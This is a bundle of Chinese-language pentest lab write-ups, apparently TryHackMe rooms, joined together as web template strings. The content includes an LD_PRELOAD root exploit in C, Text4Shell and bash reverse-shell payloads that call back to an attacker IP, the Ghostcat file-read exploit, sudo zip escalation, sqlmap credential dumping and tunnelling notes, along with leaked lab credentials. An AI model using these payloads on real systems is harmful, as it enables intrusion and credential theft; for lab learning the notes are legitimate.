{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }


\`\`\`

\`\`\`
webdeveloper@sky:/$ whoami
whoami
webdeveloper

\`\`\`


\`\`\`
webdeveloper
webdeveloper@sky:/$ sudo -l
sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
\`\`\`



## rootshell

https://whitecr0wz.github.io/posts/LD_PRELOAD/

\`\`\`
webdeveloper@sky:~$ sudo -l
sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
webdeveloper@sky:~$ file /usr/bin/sky_backup_utility
file /usr/bin/sky_backup_utility
/usr/bin/sky_backup_utility: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1edd422e86d9c4cdb136d11a2dfbda966aa326d, for GNU/Linux 3.2.0, not stripped
webdeveloper@sky:~$ strings /usr/bin/sky_backup_utility
strings /usr/bin/sky_backup_utility
/lib64/ld-linux-x86-64.so.2
puts
printf
system
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\\A]A^A_
Sky Backup Utility
Now attempting to backup Sky
tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*
Backup failed!
Check your permissions!
Backup successful!
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
sky.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
system@GLIBC_2.2.5
printf@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

\`\`\`

\`tar\`\`/var/www/html/\`\`/root/.backup/\`


\`\`\`
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
\`\`\`


\`\`\`
gcc exploit.c -o exploit -fPIC -shared -nostartfiles -w
\`\`\`

\`\`\`
sudo LD_PRELOAD=/tmp/exploit /usr/bin/sky_backup_utility
root@sky:/tmp# whoami;hostname;id;ip a
root
sky
uid=0(root) gid=0(root) groups=0(root)
\`\`\`
## 知识点回顾

1. 任意文件上传
2. 通过 MongoDB 数据库中的明文加密进行权限提升\`backup\`
3. 通过滥用环境变量进行权限提升\`LD_PRELOAD\`
## 总结

`,mn=`---
title: solr 代码执行 (CVE-2019-12409)
tags:
  - CVE
categories:
  - 网络安全
---


Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。


![alt text](../assets/img/image-74.png)`,hn=`---
title: tex2shell
tags:
  - 靶场
description:
---
## 题目描述

> 难度：
> 描述：
> 前置条件：

---
## 基本信息  

| 🚀  | 本地机器信息      | 目标机器信息        |
| --- | ----------- | ------------- |
| IP  | 10.17.5.121 | 10.10.216.153 |
| OS  | kali        | linux         |

## 信息搜集

### 端口扫描

\`\`\`

PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
8080/tcp open  http-proxy syn-ack
\`\`\`
### 路径枚举

\`\`\`
http://10.10.216.153/dev/secret.txt

From Testing Department
Hello developers netcat can't execute commands on server you can use traditional netcat commands
\`\`\`

## 信息发现

\`\`\`
└─$ ftp 10.10.216.153
Connected to 10.10.216.153.
220 (vsFTPd 3.0.5)
Name (10.10.216.153:leo): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41942|)
150 Here comes the directory listing.
-rw-r--r--    1 65534    65534          33 Aug 07 17:54 msg.txt
226 Directory send OK.
ftp> get msg.txt
local: msg.txt remote: msg.txt
229 Entering Extended Passive Mode (|||9215|)
150 Opening BINARY mode data connection for msg.txt (33 bytes).
100% |*******************************************************************************************************|    33        7.47 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.11 KiB/s)
ftp> exit
221 Goodbye.

┌──(leo㉿HACK)-[~/SecLab]
└─$ cat msg.txt
Hello Hackers Welcome in pWnbox.

\`\`\`
## 漏洞发现

XSS

![](../assets/img/Pasted%20image%2020241120014623.png)

## 漏洞利用


 _Java Spring_
里面里面的javascript rce?


## webshell

payload

Text4shell（CVE-2022-42889）

\`\`\`
{script:javascript:java.lang.Runtime.getRuntime().exec('nc.traditional -v $target_IP $target_PORT -e /bin/bash ')
\`\`\`


![](../assets/img/Pasted%20image%2020241120021514.png)

\`\`\`
\${script:javascript:java.lang.Runtime.getRuntime().exec('nc.traditional 10.17.5.121 4443 -e /bin/bash')}
\`\`\`
## usershell

\`\`\`
└─$ rlwrap nc -lvnp 4443
Listening on 0.0.0.0 4443
Connection received on 10.10.216.153 42288
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
id
uid=1000(pwnboy) gid=1000(pwnboy) groups=1000(pwnboy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)
python3 -c 'import pty; pty.spawn("/bin/bash")'
pwnboy@pwnbox:/$ ls
ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var
pwnboy@pwnbox:/$ whoami
whoami
pwnboy
\`\`\`

## rootshell

![](../assets/img/Pasted%20image%2020241120023054.png)

![](../assets/img/Pasted%20image%2020241120023027.png)

\`\`\`
# id
id
uid=0(root) gid=0(root) groups=0(root)
\`\`\`
## 知识点回顾
## 总结

`,gn=`---
title: THM-
tags:
  - 靶场
  - THM
---
> 一句话总结：

# 🚀 靶场概述 
**难度**：  
**描述**：  

---

## 📋 基本信息 
| 🚀     | **本地机器信息**    | **目标机器信息** |
| ------ | ------------- | ---------- |
| **IP** | \`10.17.5.121\` | 10.10.61.3 |
| **OS** | \`Kali\`        |            |

---

## 🔍 信息搜集

### 1. 🛠️ 端口扫描
- 使用工具如 \`nmap\` 或 \`masscan\` 进行端口扫描，发现目标机器开放的端口。
    \`\`\`bash
    nmap -sS -p- 10.17.5.121  # 执行全端口扫描
    nmap -sV -p <端口> 10.17.5.121  # 扫描开放端口的服务版本
    \`\`\`

### 2. 🔎 路径探测
- 扫描网站或系统的开放路径，寻找潜在的漏洞。
   \`\`\`bash
   
    gobuster dir -u http://10.17.5.121 -w /usr/share/wordlists/dirb/common.txt
    dirb http://10.17.5.121
    \`\`\`

### 3. 🧰 服务枚举
- 对服务进行详细的枚举，寻找潜在漏洞。
    - 使用工具如 \`nmap\`、\`nikto\`、\`dirbuster\` 等。

---

## 🧠 渗透思路

### 1. ⚡ 攻击向量
- 根据目标机器暴露的服务和漏洞，选择攻击路径。
    - 如 Web 漏洞、SSH 漏洞等。

### 2. 💥 nday 利用
- 查找未打补丁的漏洞，利用公开的 **nday** 漏洞。
    - 通过 Metasploit 或自定义脚本进行利用。

### 3. 🔍 信息审计
- 审计目标系统，查找敏感信息或配置错误。
    - 通过配置文件、日志文件等进行信息审计。

---

## 🌐 Web 渗透测试

- **Web 漏洞扫描**：使用 Burp Suite、Nikto 等工具进行 Web 应用的扫描。
- **漏洞利用**：利用常见漏洞，如 SQL 注入、XSS 等，进行进一步测试。

---

## 🔐 横向移动与后渗透操作

- **横向移动**：一旦获取基础 shell，搜索网络内其他潜在目标，进行横向渗透。
- **后渗透操作**：
    1. 获取敏感信息（如数据库、用户凭证）。
    2. 持久化访问，通过反向 shell、计划任务等手段保持连接。

---

## 🕵️‍♂️ 漏洞利用

### 漏洞名称：<漏洞名称>
- **描述**：<漏洞描述>
- **利用过程**：
    1. **漏洞分析**：<简要描述漏洞的成因>
    2. **编写利用脚本** 或 **使用现有工具**：<如何利用>
    3. **验证漏洞是否有效**：<验证步骤>
    4. **获取相关权限或信息**：<攻击目标后获取的权限>

---

## 💻 getshell

- **描述**：通过漏洞获取目标机器的 shell（命令行访问）。
- **步骤**：
    1. 使用反向 shell 获取访问权限：
        \`\`\`bash
        nc -lvnp 4444
        bash -i >& /dev/tcp/10.17.5.121/4444 0>&1
        \`\`\`
    2. **验证 shell 是否成功**：
        \`\`\`bash
        whoami
        id
        \`\`\`

---

## 🔨 提权

- **描述**：在目标系统中进行权限提升，获取 root 权限。
- **步骤**：
    1. 查看当前用户和权限：
        \`\`\`bash
        whoami
        id
        \`\`\`
    2. 查找本地提权漏洞或配置错误：
        - 使用 \`linpeas\`、\`GTFOBins\` 查找提权方法。
    3. 提升权限至 root 用户：
        \`\`\`bash
        sudo /bin/bash  # 提升为 root
        \`\`\`

---

## 📚 知识点回顾

- **信息搜集技巧**：
    - 端口扫描与服务枚举技巧。
    - Web 漏洞检测技巧（SQL 注入、XSS 等）。
- **漏洞利用技巧**：
    - 如何使用 Metasploit 或自行编写漏洞利用脚本。
    - 获取反向 shell 与持续访问。
- **Post-Exploitation 技巧**：
    - 获取目标的敏感信息和访问权限。
    - 提升权限，进行横向移动。

---

## 🧳 攻击链与流程图

- 可视化渗透测试的整体攻击过程，确保每一步都清晰。

---

## 📅 总结

- **成功步骤**：简要描述成功的渗透测试步骤和关键点。
- **遇到的困难与挑战**：列出在过程中遇到的难点及解决方案。
- **后续建议**：对靶场的进一步探索或防御建议。
`,un=`---
title: tomghost
tags:
  - 靶场
  - THM
description:
---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息        |
| --- | ----------- | ------------- |
| IP  | 10.17.5.121 | 10.10.211.222 |
| OS  | Kali        | Linux ubuntu  |
## 信息搜集

### 端口扫描

\`\`\`bash

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 60
53/tcp   open  domain     syn-ack ttl 60
8009/tcp open  ajp13      syn-ack ttl 60
8080/tcp open  http-proxy syn-ack ttl 60

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (216B)


\`\`\`

进一步进行版本探测
\`\`\`

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped syn-ack ttl 60
8009/tcp open  ajp13      syn-ack ttl 60 Apache Jserv (Protocol v1.3)
8080/tcp open  http       syn-ack ttl 60 Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


\`\`\`
### 路径枚举

## 漏洞利用

搜索
\`\`\`
apache jserv protocol v1.3 exploit
\`\`\`

![](../assets/img/Pasted%20image%2020241116163206.png)

\`\`\`
git clone https://github.com/leonooo13/CNVD-2020-10487-Tomcat-Ajp-lfi.git
\`\`\`

\`\`\`
└─$ python CNVD-2020-10487-Tomcat-Ajp-lfi.py -h           
usage: CNVD-2020-10487-Tomcat-Ajp-lfi.py [-h] [-p PORT] [-f FILE] target

positional arguments:
  target                Hostname or IP to attack

options:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  AJP port to attack (default is 8009)
  -f FILE, --file FILE  file path :(WEB-INF/web.xml)
\`\`\`

\`\`\` bash
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 10.10.211.222                       
-----------------------------------
目标: 10.10.211.222 端口: 8009 文件:WEB-INF/web.xml
-----------------------------------
Getting resource at ajp13://10.10.211.222:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

\`\`\`
## webshell

## usershell

ssh登录

\`\`\`
 skyfuck:8730281lkjlkjdqlksalks 
\`\`\`

\`\`\`
skyfuck@ubuntu:~$ ls -la
total 40
drwxr-xr-x 3 skyfuck skyfuck 4096 Nov 16 00:44 .
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Nov 16 00:44 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc

\`\`\`


\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/tomghost]
└─$ gpg2john tryhackme.asc > hash.txt

File tryhackme.asc
\`\`\`


\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/tomghost]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2024-11-16 03:55) 25.00g/s 26800p/s 26800c/s 26800C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

\`\`\`

导入pgp秘钥文件，期间输入上面的密码

\`\`\`
└─$ gpg --import tryhackme.asc
gpg: 钥匙箱‘/home/kali/.gnupg/pubring.kbx’已创建
gpg: /home/kali/.gnupg/trustdb.gpg：建立了信任度数据库
gpg: 密钥 8F3DA3DEC6707170：公钥 “tryhackme <stuxnet@tryhackme.com>” 已导入
gpg: 密钥 8F3DA3DEC6707170：私钥已导入
gpg: 密钥 8F3DA3DEC6707170：“tryhackme <stuxnet@tryhackme.com>” 未改变
gpg: 处理的总数：2
gpg:               已导入：1
gpg:              未改变：1
gpg:       读取的私钥：1
gpg:   导入的私钥：1
\`\`\`
gpg解密\`credential.pgp\`文件，期间再次输入上面的密码

\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/tomghost]
└─$ gpg credential.pgp        
gpg: 警告：没有提供命令。正在尝试猜测您的意图...
gpg: 注意：接收者的偏好设置中找不到密文算法 CAST5
gpg: 由 1024 位的 ELG 密钥加密，标识为 61E104A66184FBCC，生成于 2020-03-11
      “tryhackme <stuxnet@tryhackme.com>”
\`\`\`

\`\`\`
└─$ cat credential      
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j                                                                                                                                
┌──(kali㉿kali)-[~/Documents/thm/tomghost]
└─$ ssh merlin@10.10.211.222            
merlin@10.10.211.222's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1

\`\`\`


\`\`\`
merlin@ubuntu:~$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

\`\`\`



## rootshell

gobins 提权

![](../assets/img/Pasted%20image%2020241116170030.png)


\`\`\`
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
\`\`\`

 痕迹清理
\`\`\`
rm $TF 
\`\`\`
## 知识点回顾
## 总结

`,_n=`---
title: update_blog
date: 2024-11-13 19:53:39
tags:
  - 笔记
---
## 迁移博客

使用OBS来进行博文管理
使用Hexo 来进行 页面生成

之前采用的是采用 [Jekyll](https://jekyllrb.com/) 主题 [Chirpy](https://github.com/cotes2020/jekyll-theme-chirpy)对于写笔记来说不太灵活，有点耗时。
不适用 github action 的原因是不想把为未经过渲染的文件也放到github上，有点乱。

![](../assets/img/Pasted%20image%2020241113201822.png)


![](../assets/img/Pasted%20image%2020241113205749.png)

![](../assets/img/Pasted%20image%2020241113210121.png)`,Sn=`---
title: 枚举在渗透测试中的常见应用
tags:
  - "#SQLI"
  - "#sqlmap"
---
> 侵入这个模拟的易受攻击的基础设施。没有谜题。枚举是关键。


目标: http://vulnnet.thm/  10.10.39.63


\`\`\`
[18:22:25] 301 -  308B  - /css  ->  http://vulnnet.thm/css/
[18:22:40] 301 -  310B  - /fonts  ->  http://vulnnet.thm/fonts/
[18:22:48] 200 -  518B  - /images/
[18:22:48] 301 -  311B  - /images  ->  http://vulnnet.thm/images/
[18:22:55] 200 -  105B  - /js/
[18:23:34] 200 -  430B  - /README.txt
[18:23:40] 403 -  276B  - /server-status/
[18:23:40] 403 -  276B  - /server-status
\`\`\`

子域

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211182854.png)

blog.vulnnet.thm
shop.vulnnet.thm
api.vulnnet.thm

有个api请求
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211183337.png)

存在sql注入
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211183652.png)


\`\`\`
sqlmap -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -p blog --dbms=mysql  -D vn_admin -T be_users -C username,password,admin --dump
\`\`\`


\`\`\`
cut -d "," -f2 home/leo/.local/share/sqlmap/output/api.vulnnet.thm/dump/vn_admin/be_users.csv > ./test1.txt
\`\`\`


![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211185547.png)

通过指定密码blog 下的password 爆破hash

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211191531.png)

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192935.png)

获取登录凭证
\`\`\`
chris_w
vAxWtmNzeTz
\`\`\`
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192112.png)

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192258.png)

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211193750.png)

取消黑名单

![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194102.png)

上传webshell
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194425.png)


![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194542.png)
`,bn=`---
title: 
tags:
  - 靶场
description:
---
## 题目描述

> 难度：
> 描述：
> 前置条件：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息 |
| --- | ----------- | ------ |
| IP  | 10.17.5.121 |        |
| OS  | kali        |        |

## 信息搜集

### 端口扫描

\`\`\`
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

### 路径枚举

ftp anenomous

\`\`\`
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
\`\`\`

SSRF ?

## 漏洞发现

## 漏洞利用

## webshell

## usershell

## rootshell


## 知识点回顾
## 总结

`,vn=`---
title: THM-wreath
tags:
  - 靶场
  - THM
---
> 一句话总结：

# 🚀 靶场概述 
**难度**：  
**描述**：  了解如何通过入侵面向公众的 Web 计算机并通过隧道传输您的流量以访问 Wreath 网络中的其他计算机来通过网络进行转换

![拓扑图](../../assets/img/Pasted%20image%2020241121145312.png)
![](../../assets/img/Pasted%20image%2020241121145417.png)

---

## 📋 基本信息 
| 🚀     | **本地机器信息**  | **目标机器信息**    |     |
| ------ | ----------- | ------------- | --- |
| **IP** | 10.50.86.16 | 10.200.85.200 |     |
| **OS** | \`Kali\`      |               |     |


---

## 🔍 信息搜集

### 1. 🛠️ 端口扫描
- 使用工具如 \`nmap\` 或 \`masscan\` 进行端口扫描，发现目标机器开放的端口。
  
	\`\`\`bash
naabu -host 10.200.85.200
22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
443/tcp   open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)

Aggressive OS guesses: Linux 3.10 - 3.13 (90%)
    \`\`\`

### 2. 🔎 路径探测
- 扫描网站或系统的开放路径，寻找潜在的漏洞。
   \`\`\`bash
   
    gobuster dir -u http://10.17.5.121 -w /usr/share/wordlists/dirb/common.txt
    dirb http://10.17.5.121
    \`\`\`

### 3. 🧰 服务枚举
- 对服务进行详细的枚举，寻找潜在漏洞。
    - 使用工具如 \`nmap\`、\`nikto\`、\`dirbuster\` 等。

---

## 🧠 渗透思路

### 1. ⚡ 攻击向量
- 根据目标机器暴露的服务和漏洞，选择攻击路径。
    ![](../assets/img/Pasted%20image%2020241121151503.png)

\`\`\`
10000/tcp open  http     MiniServ 1.890 (Webmin httpd) 
\`\`\`
![](../assets/img/Pasted%20image%2020241121152025.png)
### 2. 💥 nday 利用
- 查找未打补丁的漏洞，利用公开的 **nday** 漏洞。
    -![](../assets/img/Pasted%20image%2020241121152808.png)

### 3. 🔍 信息审计
- 审计目标系统，查找敏感信息或配置错误。
    - 通过配置文件、日志文件等进行信息审计。
![](../assets/img/Pasted%20image%2020241121153104.png)

\`\`\`
$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
\`\`\`

---

## 🌐 Web 渗透测试

- **Web 漏洞扫描**：使用 Burp Suite、Nikto 等工具进行 Web 应用的扫描。
- **漏洞利用**：利用常见漏洞，如 SQL 注入、XSS 等，进行进一步测试。

---

## 🔐 横向移动与后渗透操作

- **横向移动**：一旦获取基础 shell，搜索网络内其他潜在目标，进行横向渗透。
- **后渗透操作**：
    1. 获取敏感信息（如数据库、用户凭证）。
    2. 持久化访问，通过反向 shell、计划任务等手段保持连接。

---

## 🕵️‍♂️ 漏洞利用

### 漏洞名称：<漏洞名称>
- **描述**：<漏洞描述>
- **利用过程**：
    1. **漏洞分析**：<简要描述漏洞的成因>
    2. **编写利用脚本** 或 **使用现有工具**：<如何利用>
    3. **验证漏洞是否有效**：<验证步骤>
    4. **获取相关权限或信息**：<攻击目标后获取的权限>

---

## 💻 getshell

- **描述**：通过漏洞获取目标机器的 shell（命令行访问）。
- **步骤**：
    1. 使用反向 shell 获取访问权限 进一步稳定的shell：
        \`\`\`bash
        nc -lvnp 4444
        bash -i >& /dev/tcp/10.17.5.121/4444 0>&1
        \`\`\`
    2. **验证 shell 是否成功**：
        \`\`\`bash
        whoami
        id
        \`\`\`
	3. 获取id_rsa
	![](../assets/img/Pasted%20image%2020241121154958.png)
	
---

## 🔨 提权

- **描述**：在目标系统中进行权限提升，获取 root 权限。
- **步骤**：
    1. 查看当前用户和权限：
        \`\`\`bash
        whoami
        id
        \`\`\`
    2. 查找本地提权漏洞或配置错误：
        - 使用 \`linpeas\`、\`GTFOBins\` 查找提权方法。
    3. 提升权限至 root 用户：
        \`\`\`bash
        sudo /bin/bash  # 提升为 root
        \`\`\`

---


## 隧道代理和端口转发

我们用于透视的方法往往因不同的目标操作系统而异。像 Metasploit 这样的框架可以简化这个过程，但是，目前，我们将寻找更多的手动技术来进行透视。

渗透测试的这一领域包含两种主要方法：

- **隧道/代理：** 通过受感染的计算机创建代理类型的连接，以便将所有所需的流量路由到目标网络。这也可能在另一个协议（例如 SSH 隧道）内_进行隧道_传输，这对于规避基本 **I**ntrusion **D**etection **S**ystem （IDS） 或防火墙非常有用  
    
- **端口转发：**通过受损主机在本地端口和目标上的单个端口之间创建连接

如果我们想将大量不同类型的流量重定向到我们的目标网络 -- 例如，使用 nmap 扫描，或者访问多台不同机器上的多个端口，那么代理是很好的。

端口转发往往更快、更可靠，但只允许我们访问目标设备上的单个端口（或小范围）。

哪种 pivoting 样式更合适完全取决于网络的布局，因此在决定如何进行之前，我们必须从进一步的枚举开始。此时，明智的做法是开始绘制您所看到的网络布局 —— 尽管在这个练习网络的情况下，布局在屏幕顶部的框中给出。

作为一般规则，如果您有多个可能的入口点，请尽可能使用 Linux/Unix 目标，因为这些目标往往更容易从中转。面向外部的 Linux Web 服务器绝对是理想的选择。  

本节中的其余任务将涵盖以下主题：

- 使用本机和静态编译工具枚举网络
- 代理链 / FoxyProxy
- SSH 端口转发和隧道（主要是 Unix）
- plink.exe （Windows）
- socat（Windows 和 Unix）  
- 凿子 （Windows 和 Unix）
- sshuttle （目前仅限 Unix）

ocat 不仅非常适合完全稳定的 Linux shell[[1]](https://tryhackme.com/room/introtoshells)，也非常适合端口转发。socat 的一大缺点（除了经常出现的问题 人们已经学习了语法），因为它很少由 default 在目标上。也就是说，静态二进制文件很容易找到 [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) 和 [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download) 都可用。 请记住，Windows 版本不太可能绕过防病毒软件 software 默认，因此可能需要自定义编译。在我们开始之前，值得注意的是：如果您已经完成了 [What the Shell？](https://tryhackme.com/room/introtoshells)房间，您将知道 Socat 可用于创建加密连接。此处显示的技术可以与 shells room 中详述的加密选项相结合，以创建加密的端口转发和中继。为避免使本节过于复杂，这里不会教授这种技术;但是，在您自己的时间进行实验是非常值得的。  

虽然以下技术不能用于将完整代理设置到目标网络中，但很有可能使用它们成功地转发来自 Linux 和 Windows 受损目标的端口。特别是，socat 是一个非常好的中继：例如，如果您试图在与攻击计算机没有直接连接的目标上获取 shell，则可以使用 socat 在当前受感染的机器上设置中继。这将监听来自目标的反向 shell，然后立即将其转发回攻击框：

![Diagram demonstrating the purpose of a relay to forward a shell back from a target PC](https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png)  

最好将 socat 视为将两件事连接在一起的一种方式——有点像 Portal 游戏中的 Portal Gun，它在两个不同的位置之间建立了联系。这可以是同一台机器上的两个端口，可能是在两台不同的机器之间创建一个中继，可能是在端口和监听机器上的文件之间创建一个连接，或者许多其他类似的事情。这是一个非常强大的工具，非常值得您在自己的时间里研究。

